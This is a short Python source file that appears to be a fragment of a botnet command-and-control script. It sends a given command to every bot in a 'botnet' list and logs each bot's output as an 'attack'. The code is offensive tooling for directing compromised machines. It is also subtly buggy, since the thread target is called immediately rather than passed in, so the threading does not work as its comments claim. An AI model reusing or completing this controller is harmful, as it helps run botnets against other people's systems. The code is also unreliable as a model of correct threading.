from common.commondefs import true
import threading

def command_bots(command, botnet):
    print('attempting attack with command "'+command+'"') # Log command
    for bot in botnet: # Iterate through botnet
        commandThread = threading.Thread(target=command_bot(command, bot)) # Init command thread
        commandThread.daemon = true # Run as background thread
        commandThread.start() # Start command thread

def command_bot(command, bot):
    print('attempting on bot '+bot.host)
    attack = bot.send_command(command) # Store attack
    print('Output from '+bot.host) # Log output
    print(attack) # Log attempted attack
